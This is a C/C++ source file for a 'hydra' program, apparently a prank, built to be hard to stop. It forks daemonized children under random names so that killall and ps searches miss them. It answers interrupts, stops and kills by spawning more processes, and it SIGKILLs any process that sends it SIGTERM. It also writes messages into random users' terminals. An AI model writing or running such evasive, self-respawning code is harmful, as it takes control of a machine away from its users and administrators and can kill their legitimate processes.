#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <ctype.h>
#include <signal.h>
#include <errno.h>
#include <time.h>
#include <dirent.h>
#include <vector>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/ipc.h>
#include <sys/shm.h>

void sigchld_handler(int sig);
void sigint_handler(int sig);
void sigtstp_handler(int sig);
void sigterm_handler(int sig, siginfo_t *info, void *context);

char **argv; 
int *rage;
char *weakness;

void gen_random(char *s, const int len) {
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    int i;
    for (i = 0; i < len; ++i) {
        s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
    }

    s[len] = 0;
}

void print_hydra() {
    printf("                                       I?I                         \n"
"             I                                      ~M88M                       \n"
"         Z   O                      +    ~        I +ZM,,                       \n"
"         Z   $7                     :    M          Z?M=:Z                      \n"
"      O  :7==:,??~IZ$7    Z      O  :M   7 =    7:~:$ZMM7:7                     \n"
"      :I~7?:I:IIODDZDO7+  +  7    I  M7 +M D    877:O .I=I~+$=I+                \n"
"    ? ++?,~7Z78Z8MN8D$N7MM$  ~     ?+=$MID~D?     +OZ7?~7~+$IM$~                \n"
"     Z++$D87~    :$$$N:+O~+O++  $  +,O87O$O=?$~I     ?ZO.7+++:~:$+ =?~          \n"
"    ?~+=$D:         I~DI8Z777?? $7I+O$IZM+I8M$$$$     +I88??++N7M78D            \n"
"    I7DMO        ~7~ N7+MODZ+D7?=M:MI8,7MDM=ODOZ$$      +=,?$M=87=M7            \n"
"   $?IZM7       ~=7Z$M78M77ZM8$$7$8MN$$$   D++8ZZ7$       =,I:DN?77DI?          \n"
"  +O?N:7O      ?8:8$DO~N7I:7D?$Z$D7=$M?=    =?,N?M$        ?:I?NZO7$7           \n"
" I=$?OI~Z    I+IZ~77Z$D~=8+$=NZD$:M=$,Z==   ,M~:$NN?        7:=7?7OM            \n"
"  77$77ZZ   7DI?I7NZ  I:D8,?,8$Z: I~I:+D7   =N=N7:,8          ?7~D$OI           \n"
"  ~=$==7?   ZOI:?7    7$+$===8$7   =I?~O$=+=77:7ZZ+O+7        I=?O$D            \n"
"   ~:$:~:Z  $  =D7    ZMI+~=DOI~ ~  =:D+$+~ON8NDZDDM$ZI       ~,:87I            \n"
"    IM$~:~      :     MI,:=~M$$, .8.8~?D+O:=7+:7MD7ZZDN+      =~:DOZ            \n"
"     MM?8?D +   D Z++=7=?.,O+OON=,78$N?M,O$:II?$ZOI,7~77=    ++~+$$$            \n"
"    D:M:??O IN ?D+M8DM =,,~8$+M.M77M7777? IO=MOOZZ7.~:$7N   ?7::I7$=            \n"
"    I$M7:D  ID$7NNMMM.I7~777=?M?I$=ODDZON+?.D.~,IDZ :~788   :==~OZ7             \n"
"     +    D$$MMZONZD?:$~+=DOO+~$II7M7ZN$?,O==Z,Z8M77=,NZ? +~:~~ZO?~             \n"
"    O     +M$7ZMN$  =$7OI78Z++7MODON$~    ,,$I$8I:=Z+$8I ~I=+?ZO==              \n"
"         I77DD$8    7D$I7?I~?$.I?O8NM+    7$ZZ~DI$,Z+O$O~+I7?$$7$               \n"
"       ~==$M8D~     77ZM$?~?DIMMI$N,D8   =~Z~NIZ?,??Z?$?I?+?8?O:                \n"
"    I  D?Z~,=:?      ?7DM:$~ZZI8++8MO.  7~IZ~M~~:=IIZNO7IIOZ$O                  \n"
"     ?+=O~?7+M77   Z $+?,,7~~?$77ZMM8  N=II=?Z?7Z$7$NZNMZ$ZD7                   \n"
"     IZI$MNMNZ     ~7,=8?7+,?8=I8MI7+ ZIOI77+$Z7ZIIMNO87778                     \n"
"        +I+DI=7      ~M8M~~77+:~MDNN$?==7?7=+7+8NZMDD7IZ:                       \n"
"         =8?~?+      ?=?+8$N=::7$8$78~~+=:~?Z7Z7MNZ7$$                          \n"
"          +=.7O          MDM+8?NN77I=:===,Z7O$IMNIN7      8 ? +                 \n"
"          7=O$$8         ~:7. D$78O$+?77ID8ZI$D$7M8    ++?O8Z8?7D  7            \n"
"           II:N          ?=,.,+$=7+III7$Z?$7I7$$O$7I=7+N8OO77++N 8+:            \n"
"            O ~           777~+7$=I+~IZ$$8I8+=NZ~?87IIOI?7Z$+7++~?,++~          \n"
"                           7ZZ?Z$=O?: ?= :787INO7=7N+8I8NZ7Z7?+7877?7O=:        \n"
"                            7++I7+7M++7?7Z+7O:?77ZI7OZZ77?7$=$7$7=?7IOZ+        \n"
"                             ?I7=77I7?D8I+=:I+OZ$78IZI+Z7$I$+=I:O7IZ7OO+O       \n"
"                            ID77$$7$I7~+?..7~I?7$I77IZO7=7I7=I:.$D7$I=7==       \n"
"                            =OD7OZ7:I=?:: +,~7I~$Z7?7IZ:$NI7I7?~IZI?~Z7Z$7$     \n"
"                            I7+:~?IZ+7:  :,,~+77O7IO8M7NZ:,=:.,7?OI=????$Z      \n"
"                           ~7:+,=77O7O?:7~$?7I:?N7I8Z777+.I++:==7$I$77ZZI7?     \n"
"                           ?+7+I?O=:==7?:+77+Z?N7$O88$$D=:7=?~+?77I=O$$+7N8     \n"
"                           778:,~==:I$?7+,.~8$$OZ$ZZ$?$I,=7:+=+O$OOMZI$$IOII    \n"
"                         . ?+O8I7:??I?$.  I$+DZ?N7Z7ZZ7::?IO??$O=$Z=$?=ZZ?8     \n"
"                        :~7=IO7Z7?O?7Z7=I:?8$??7NDOO8Z7=~78$IZZ7:7$N7M??7?$     \n"
"                      I=I8$O=I7O= ,ZO+D+7II??O8M778$ZO7=+~~77Z=ID8O7=ODZ87Z     \n"
"                     :+$$~$Z,~$         +IID$I7, $O8?N8:I:?=++7O+O$NZ$8=$+$     \n"
"                    ~Z?O+$~Z+OI         I$II$O=I7$8+7OD~I:~IZ77$?,+MN78+8N8     \n"
"         ~+I:~+ ,= 7+I?777??D          :?.7Z$:7I7=IO?O?~777+7Z==I=77. :O??      \n"
"       $IN$?M8NM:~?~~8I7~+$N,           : I7~7?~.OI8?777ZM?=I8IZI?I =7~DN=      \n"
"      ?ZO       8NZ+,~:77I$:           I77?I7?=      =$=+$Z77D=I=~:O$?77N.      \n"
"     D8       =:+=$DOI+I=,            ?7~~7I+:         D+O77ZM  $?I$II$M7       \n"
"     7      ?II=I=I7N7I~~+7           7~:8I==         IZ7IDD$  I7I==+=7I        \n"
"          +?=77=$8I  :88I=:~+        Z?:I?+=         ?77+77Z :=8+7:7IO7=        \n"
"         :Z~I=?I7      8$D:~:~=      =++=?=        7=??:OZ? =??8I8,?+I~II       \n"
"         .$I,$7+I       ~7D?::=I=   I+I+Z$=       ~MN$OZ78~??+7=ZMI.I$$?+       \n"
"       ??:7$7?Z=77        ~ZN7=~I7I77IZI=$I     ,D$$I7+?77?I=+$$8O77=~O+7       \n"
"     7I=I8:I8=? ?+7         7?N=+=~7~$+$:+7I7+OIZ$7:,=Z:.I~?8ZO~??===~7IN       \n"
"    :+Z?,?I,?                  NNN$8I$=.::I+?D?77=??7:+7I8O7? ~+~?~,I8I~+O      \n"
"                                 IM8~::I7+:O8:,M8?7O7I7877MOI.+$$+?7$7??I78     \n"
"                                  =~7?7I+?:~ 7$IO$7O$7IDZ ~ 7O$8+:=:$I$D+??Z    \n"
"                                  =7     ~7=$~+=                  =7+           \n");
}

pid_t new_head() {
    pid_t pid;
    char name[8];
    gen_random(name, 7);
    *rage = *rage + 1;
    if((pid = fork()) == 0) {
        //Reseed the random number generator
        srand(getpid());
        //New process group
        setpgid(0, 0);
        //Dameonize
        setsid();
        //Set process name and command name to a
        //randomly generated string (prevent killall
        //or greping ps aux)
        prctl(PR_SET_NAME, name);
        strcpy(argv[0], name);
    }
    return pid;
}

//A day in the life of a hydra
void hydra_day_to_day() {
    //Yeah I'm using a vector here... sue me
    std::vector<pid_t> pids;
    pid_t pid;
    
    //Let them know who we are
    printf("I am the hydra!!!! (%d) I'm at a rage of %d\n", getpid(), *rage);
    
    //Find a victim to eat
    DIR* proc = opendir("/proc");
    struct dirent* process;
    //Read through /proc and pull out any number looking things
    //these are probably pids
    while ((process = readdir(proc)) != NULL) {
        if ((pid = atoi(process->d_name)) > 0) {
              pids.push_back (pid);
        }
    }
    int target = rand() % pids.size();
    printf("I will eat %d\n", pids[target]);
    
    //EAT THEM!!!!
    //kill(pids[target], SIGKILL);
    
    //Choose a random terminal and write to it
    DIR* term = opendir("/dev/pts");
    struct dirent* terminal;
    std::vector<char *> terminals;
    int t;

    while ((terminal = readdir(term)) != NULL) {
        if ((t = atoi(terminal->d_name)) > 0) {
              terminals.push_back(terminal->d_name);
        }
    }
    target = rand() % terminals.size();
    char name[20] = "/dev/pts/";
    strcat(name, terminals[target]);
    printf("I will make myself known to %s\n", name);
    
    int fd = open(name, O_WRONLY | O_APPEND);
    if (fd != -1) {
        int color1 = rand() % 2;
        int color2 = (rand() % 8) + 30;
        int bgcolor = (rand() % 8) + 40;
        //write(fd, assertion_of_greatness, 23);
        dprintf(fd, "%c[%d;%d;%dmI am the hydra!\n", 0x1B, color1, color2, bgcolor);
        close(fd);
    }
    
    //Take a rest (more rage -> shorter rests)
    sleep(*rage >= 10 ? 1 : 10 - *rage);
}

void check_weakness() {
    if (!strcmp((char *) (rage+1), "By the power of Zeus!")) {
        exit(0);
    }
}
int main(int argc, char **argv1) {
    print_hydra();
    argv = argv1;
    srand (time(NULL));
    //Rebound sig int
    struct sigaction sigterm_action;
    sigterm_action.sa_sigaction = sigterm_handler;
    sigterm_action.sa_flags = SA_SIGINFO;
    //Bounce back SIGTERM
    sigaction(SIGTERM, &sigterm_action, NULL);
    
    signal(SIGCHLD, sigchld_handler);
    signal(SIGINT,  sigint_handler);
    signal(SIGTSTP, sigtstp_handler);
   
    //Set up shared memory to store rage
    //(A hydra never forgets the damage done to it's ancestors)
    int shmid = shmget(1337, sizeof(int), IPC_CREAT | 0666);
    rage = (int *) shmat(shmid, NULL, 0);
    *rage = -2;
    *(rage+1) = '\0';
    
    //The main hydra will run in the terminal
    //All children will be dameonized
    
    //Start the hydra with two heads
    if (new_head() != 0) {
        new_head();
    }
    
    while (1) {
        hydra_day_to_day();
        check_weakness();
    }
}

void sigchld_handler(int sig)
{
    //Respawn chopped off or restrained heads
    int child_status; 
    pid_t pid; 
    while ((pid = waitpid(-1, &child_status, WNOHANG | WUNTRACED)) > 0) { 
        //Check if they were stopped by a signal
        if (WIFSTOPPED(child_status)) {
            printf("Somebody tried to restrain my head %d\n", pid);
            //KEEP GOING!!!!
            kill(pid, SIGCONT);
        }
        //Check if they were killed by a signal
        if (WIFSIGNALED(child_status)) {
            printf("Somebody chopped off my head!!!! %d\n", pid);
            //Create a new head which will act as a parent to two new
            //children (see following diagram)
            /*
            Original hydra:
                 2
            1--<
                 2
            After chopping off the lower head and respawining
            
                   2
            1 -- <        3
                   2 -- < 
                          3
            The top level will react to the killing of any second level. In
            turn, the second level will react to the killing of any third level,
            etc...
            */
            if (new_head() == 0) {
                if(new_head() != 0) {
                    new_head();
                }
            }  
        }
        //Check if they exited cleanly 
        //(idk why this would happen, maybe Heracles)
        else if (WIFEXITED(child_status)) {
            printf("Heracles seems to have saved the day... for now...%d\n", pid);
        } 
    } 
}

//Deal with sigint, sigterm, and sigstp by
//blowing them off and making a new head on this body
void sigint_handler(int sig)
{
    printf("You can't interupt a hydra!\n");
    new_head();
    
}

void sigtstp_handler(int sig)
{ 
    printf("You can't stop a hydra!\n");
    new_head();
}

//If they try to terminate you. Kill them.
void sigterm_handler(int sig, siginfo_t *info, void *context) {
    
    printf("You %d tried to terminate me! I'll kill you!\n", info->si_pid);
    if(info->si_pid > 0) {
        kill(info->si_pid, SIGKILL);
    } 
    //And then spawn a new head for good measure
    new_head();
    
}

